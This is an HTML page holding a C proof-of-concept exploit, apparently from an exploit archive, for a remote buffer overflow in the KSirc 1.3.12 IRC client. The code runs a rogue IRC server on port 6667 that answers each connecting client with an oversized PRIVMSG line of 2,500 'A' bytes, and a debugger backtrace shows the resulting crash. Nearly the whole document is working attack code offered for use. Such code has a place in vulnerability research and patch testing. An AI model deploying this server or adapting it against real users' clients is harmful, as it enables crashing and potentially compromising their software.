<html><head><title>KsIRC 1.3.12 (PRIVMSG) Remote Buffer Overflow PoC</title></head><pre>// KSirc 1.3.12 - PRIVMSG remote Buffer Overflow // PoC
//
// Federico L. Bossi Bonin 
// fbossi@globalst.com.ar
// www.GlobalST.com.ar


// #0  0xb7ea8792 in KSircIOController::stdout_read () from /usr/kde/3.5/lib/libkdeinit_ksirc.so
// #1  0xb7ea78c8 in KSircIOController::qt_invoke () from /usr/kde/3.5/lib/libkdeinit_ksirc.so
// #2  0xb6fedba4 in QObject::activate_signal () from /usr/qt/3/lib/libqt-mt.so.3
// #3  0xb765410b in KProcess::receivedStdout () from /usr/kde/3.5/lib/libkdecore.so.4
// #4  0x081a6e60 in ?? ()
// #5  0x081a7238 in ?? ()
// #6  0xbfcb0170 in ?? ()
// #7  0x00000000 in ?? ()

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt; 
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

#define PORT 6667
#define LEN 2500

char buffer[LEN*2];
void sendbuff(int sock) {
char ptr[LEN*2];
memset(buffer,0x0,sizeof(buffer));
memset(ptr,0x0,sizeof(ptr));
memset(ptr,0x41,LEN);
sprintf(buffer,&quot;PRIVMSG  USER:%s\n\r&quot;,ptr);
read(sock,ptr,sizeof(ptr));
write(sock,buffer,sizeof(buffer));
}

int main() {
struct sockaddr_in srv_addr, client;
int len,pid,sockfd,sock;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

if (sockfd &lt; 0) { 
perror(&quot;error socket()&quot;); 
exit(1);
}
     
bzero((char *) &amp;srv_addr, sizeof(srv_addr));
srv_addr.sin_family = AF_INET;
srv_addr.sin_addr.s_addr = INADDR_ANY;
srv_addr.sin_port = htons(PORT);

if (bind(sockfd, (struct sockaddr *) &amp;srv_addr,sizeof(srv_addr)) &lt; 0)  {
perror(&quot;error bind()&quot;);
exit(1);
}


printf(&quot;KSirc 1.3.12 - PRIVMSG remote PoC\n&quot;);
printf(&quot;====================================\n&quot;);
printf(&quot;Listening on port %i\n&quot;,PORT);

listen(sockfd,5);
len = sizeof(client);

while (1) {
sock = accept(sockfd, (struct sockaddr *) &amp;client, &amp;len);
if (sock &lt; 0)  {
perror(&quot;error accept()&quot;);
exit(1);
}

pid = fork();
if (pid &lt; 0)  {
perror(&quot;fork()&quot;);
exit(1);
}
if (pid == 0)  {
close(sockfd);
printf(&quot;Conection from %s\n&quot;,inet_ntoa(client.sin_addr));
sendbuff(sock);
exit(0);
}
else close(sock);
} 
return 0;
}

// milw0rm.com [2006-12-26]</pre></html>